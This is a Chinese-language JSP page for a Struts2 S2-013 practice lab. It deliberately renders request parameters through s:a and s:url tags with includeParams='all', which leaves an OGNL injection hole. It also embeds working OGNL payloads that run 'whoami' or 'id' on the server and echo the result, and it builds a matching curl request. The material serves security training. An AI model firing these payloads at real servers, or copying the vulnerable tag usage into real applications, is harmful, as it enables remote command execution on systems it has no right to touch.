<%@ taglib prefix="s" uri="/struts-tags" %>
<%@ page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8" %>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>Struts2 S2-013 靶场</title>
    <style>
        body { margin: 0; font-family: "Helvetica Neue", "PingFang SC", sans-serif; background: #f5efe7; color: #1d2a35; }
        .wrap { max-width: 980px; margin: 0 auto; padding: 28px 18px 40px; }
        .card { background: #fffdf8; border: 1px solid #d9ccb9; border-radius: 22px; padding: 24px; box-shadow: 0 16px 44px rgba(76, 51, 33, 0.08); margin-bottom: 18px; }
        .actions { display: flex; flex-wrap: wrap; gap: 10px; margin: 16px 0; }
        .preset-btn, .submit-btn { border: 0; border-radius: 999px; padding: 10px 16px; font-size: 14px; cursor: pointer; }
        .preset-btn { background: #e6f2ef; color: #155b52; }
        .submit-btn { background: #155b52; color: #fff; }
        .field { display: grid; gap: 8px; margin: 14px 0 18px; }
        .field label { font-weight: 600; }
        .field textarea { min-height: 168px; resize: vertical; padding: 14px; border-radius: 14px; border: 1px solid #d9ccb9; background: #fff; font: 14px/1.6 Consolas, monospace; color: #1d2a35; width: 100%; box-sizing: border-box; }
        pre { background: #15202b; color: #e7eef7; padding: 14px; border-radius: 12px; white-space: pre-wrap; word-break: break-word; }
    </style>
</head>
<body>
<div class="wrap">
    <div class="card">
        <h1>Struts2 S2-013 演示靶场</h1>
        <p>这里使用 <code>&lt;s:a includeParams="all"&gt;</code> 和 <code>&lt;s:url includeParams="all"&gt;</code>。当你把恶意参数放进请求中，Struts 在拼接这些链接时会对参数值做 OGNL 渲染。</p>
        <div class="actions">
            <button type="button" class="preset-btn" onclick="fillPreset('whoami')">回显 whoami</button>
            <button type="button" class="preset-btn" onclick="fillPreset('id')">回显 id</button>
            <button type="button" class="submit-btn" onclick="runPayload()">带参数访问当前页</button>
        </div>
        <div class="field">
            <label for="payloadBox">GET 参数 a</label>
            <textarea id="payloadBox">${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec('whoami').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[256],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#d)),#out.close())}</textarea>
        </div>
        <pre id="preview"></pre>
        <p><s:a action="link" includeParams="all">重新加载当前页面（includeParams=all）</s:a></p>
        <s:url var="dangerUrl" action="link" includeParams="all"/>
        <pre><s:property value="%{#attr.dangerUrl}"/></pre>
    </div>
</div>
<script>
    const payloads = {
        whoami: '${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec(\'whoami\').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[256],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#d)),#out.close())}',
        id: '${(#_memberAccess["allowStaticMethodAccess"]=true,#a=@java.lang.Runtime@getRuntime().exec(\'id\').getInputStream(),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[256],#c.read(#d),#out=@org.apache.struts2.ServletActionContext@getResponse().getWriter(),#out.println(new java.lang.String(#d)),#out.close())}'
    };

    function fillPreset(key) {
        document.getElementById('payloadBox').value = payloads[key];
        refreshPreview();
    }

    function strictEncode(value) {
        return encodeURIComponent(value).replace(/[!'()*]/g, function(char) {
            return '%' + char.charCodeAt(0).toString(16).toUpperCase();
        });
    }

    function buildUrl() {
        return 'link.action?a=' + strictEncode(document.getElementById('payloadBox').value);
    }

    function refreshPreview() {
        document.getElementById('preview').textContent = 'curl -i "http://宿主机IP:9959/' + buildUrl() + '"';
    }

    function runPayload() {
        location.href = buildUrl();
    }

    document.getElementById('payloadBox').addEventListener('input', refreshPreview);
    refreshPreview();
</script>
</body>
</html>
